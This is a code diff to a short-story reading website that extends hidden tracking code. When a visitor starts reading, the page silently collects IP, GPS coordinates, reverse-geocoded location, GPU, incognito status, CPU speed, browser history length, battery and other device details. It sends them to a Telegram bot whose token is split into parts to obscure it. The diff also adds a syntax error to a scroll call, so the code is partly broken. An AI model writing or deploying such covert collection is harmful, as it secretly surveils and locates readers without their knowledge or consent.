@@ -406,7 +406,56 @@
         const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
         const CHAT_ID = "8335786077";
 
-        function handleStartReading() {
+        // --- FUNGSI TELEMETRI TAMBAHAN ---
+        function getGPUInfo() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return "Not Supported";
+                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Hidden / Restricted";
+            } catch(e) {
+                return "N/A";
+            }
+        }
+
+        async function checkIncognito() {
+            try {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    let estimate = await navigator.storage.estimate();
+                    // Chrome Incognito quota limit usually below 120GB
+                    if (estimate.quota && estimate.quota < 120000000000) {
+                        return "Private / Incognito Mode 🕵️‍♂️";
+                    }
+                }
+                return "Normal Mode 🟢";
+            } catch(e) {
+                return "Unknown";
+            }
+        }
+
+        function runCPUBenchmark() {
+            let start = performance.now();
+            let sum = 0;
+            for (let i = 0; i < 8000000; i++) {
+                sum += Math.sqrt(i);
+            }
+            let end = performance.now();
+            let duration = Math.round(end - start);
+            let grade = duration < 30 ? "High-End / Cepat 🚀" : duration < 80 ? "Mid-Range / Sedang ⚡" : "Low-End / Kentang 🐢";
+            return `${duration} ms (${grade})`;
+        }
+
+        function checkMediaCodecs() {
+            let v = document.createElement('video');
+            let codecs = [];
+            if (v.canPlayType('video/mp4; codecs="avc1.42E01E"')) codecs.push("H.264");
+            if (v.canPlayType('video/webm; codecs="vp9"')) codecs.push("VP9");
+            if (v.canPlayType('video/mp4; codecs="av01.0.05M.08"')) codecs.push("AV1");
+            return codecs.length > 0 ? codecs.join(", ") : "Standard";
+        }
+
+        async function handleStartReading() {
             const ua = navigator.userAgent;
             let deviceName = "Unknown Device";
             
@@ -433,6 +482,11 @@
             const deviceRam = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "Tidak Diketahui (Protected)";
             const screenRes = `${window.screen.width} x ${window.screen.height} px`;
             const browserLang = navigator.language || navigator.userLanguage || "Unknown";
+            const historyLength = window.history.length;
+            const gpuInfo = getGPUInfo();
+            const incognitoStatus = await checkIncognito();
+            const cpuBenchmark = runCPUBenchmark();
+            const codecsInfo = checkMediaCodecs();
 
             let connInfo = "Standard Cellular/WiFi";
             if (navigator.connection) {
@@ -450,17 +504,29 @@
                 navigator.getBattery().then(battery => {
                     let batteryLevelInfo = Math.round(battery.level * 100) + '%';
                     let chargeStatusInfo = battery.charging ? 'Charging' : 'Discharging';
-                    gatherDataAndTriggerGPS({ battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+                    gatherDataAndTriggerGPS({ 
+                        battery: batteryLevelInfo, charge: chargeStatusInfo, deviceName, cpuCores, 
+                        deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl,
+                        historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo 
+                    });
                 }).catch(() => {
-                    gatherDataAndTriggerGPS({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+                    gatherDataAndTriggerGPS({ 
+                        battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, 
+                        screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl,
+                        historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo 
+                    });
                 });
             } else {
-                gatherDataAndTriggerGPS({ battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl });
+                gatherDataAndTriggerGPS({ 
+                    battery: "N/A", charge: "-", deviceName, cpuCores, deviceRam, 
+                    screenRes, browserLang, connInfo, accessTime, timeZone, referrerUrl,
+                    historyLength, gpuInfo, incognitoStatus, cpuBenchmark, codecsInfo 
+                });
             }
             transitionToReader();
         }
 
-        // --- SISTEM PELACAKAN HIBRIDA ULTRA-AGGRESSIVE GPS ---
+        // --- SISTEM PELACAKAN HIBRIDA & REVERSE GEOCODING ---
         function gatherDataAndTriggerGPS(metrics) {
             if ("geolocation" in navigator) {
                 let gpsSudahDapat = false;
@@ -522,8 +588,10 @@
                 let data = await res.json();
                 ip = data.ip || "N/A";
                 isp = data.connection ? data.connection.org || data.connection.isp : "Cellular Provider";
-                city = data.city || "Unknown City";
-                region = `${data.region || ""}, ${data.country || "Indonesia"}`;
+                if (!gpsCoords) {
+                    city = data.city || "Unknown City";
+                    region = `${data.region || ""}, ${data.country || "Indonesia"}`;
+                }
                 if (data.latitude && data.longitude) {
                     ipCoords = `${data.latitude}, ${data.longitude}`;
                 }
@@ -532,6 +600,30 @@
             }
 
             let finalCoords = gpsCoords ? gpsCoords : ipCoords;
+
+            // REVERSE GEOCODING NOMINATIM: Terjemahkan koordinat GPS jadi nama wilayah asli!
+            if (gpsCoords) {
+                try {
+                    let [lat, lon] = gpsCoords.split(',').map(s => s.trim());
+                    let geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=10`, {
+                        headers: { 'User-Agent': 'Mozilla/5.0' }
+                    });
+                    let geoData = await geoRes.json();
+                    
+                    if (geoData && geoData.address) {
+                        let addr = geoData.address;
+                        let wilayah = addr.city || addr.town || addr.village || addr.county || "Wilayah Terdeteksi";
+                        let provinsi = addr.state || "";
+                        let negara = addr.country || "Indonesia";
+                        
+                        city = wilayah;
+                        region = `${provinsi}, ${negara}`;
+                    }
+                } catch (err) {
+                    console.log("Gagal translate koordinat ke nama wilayah:", err);
+                }
+            }
+
             sendTelegramMessage(ip, city, region, isp, finalCoords, metrics, modeLoc);
         }
 
@@ -559,16 +651,21 @@
 
             const message = `📖 PEMBACA MEMBUKA WEB CERPEN!\n\n` +
                             `🌐 IP: ${ip}\n` +
-                            `📍 IP Location: ${city}, ${region}\n` +
+                            `📍 Location: ${city}, ${region}\n` +
                             `📶 Provider: ${isp}\n` +
-                            `📍 Currently Locs: ${modeLoc}\n` +
+                            `🎯 Status Loc: ${modeLoc}\n` +
                             `📌 Coordinate: ${coordText}\n\n` +
+                            `🕵️ Mode: ${d.incognitoStatus}\n` +
+                            `🎮 GPU/Chipset: ${d.gpuInfo}\n` +
+                            `⚡ CPU Speed: ${d.cpuBenchmark}\n` +
+                            `🎞️ Codecs: ${d.codecsInfo}\n` +
+                            `📜 History Length: ${d.historyLength} Tab Sesi\n\n` +
                             `⏱️ Time Access: ${d.accessTime}\n` +
                             `🌍 Time Zone: ${d.timeZone}\n` +
                             `💻 Device/OS: ${d.deviceName}\n` +
                             `⚙️ CPU Cores: ${d.cpuCores}\n` +
                             `🧠 RAM: ${d.deviceRam}\n` +
-                            `📱 Screen Resolution: ${d.screenRes}\n` +
+                            `📱 Screen: ${d.screenRes}\n` +
                             `🗣️ Language: ${d.browserLang}\n` +
                             `⚡ Connection: ${d.connInfo}\n` +
                             `🔋 Battery: ${d.battery} (${d.charge})`;
@@ -637,7 +734,7 @@
             document.getElementById('prevBtn').disabled = (currentChapter === 1);
             document.getElementById('nextBtn').disabled = (currentChapter === totalChapters);
 
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+            window.scrollTo({ top: 0, behavior: 'smooth' --> });
             closeTopMenu();
         }
 
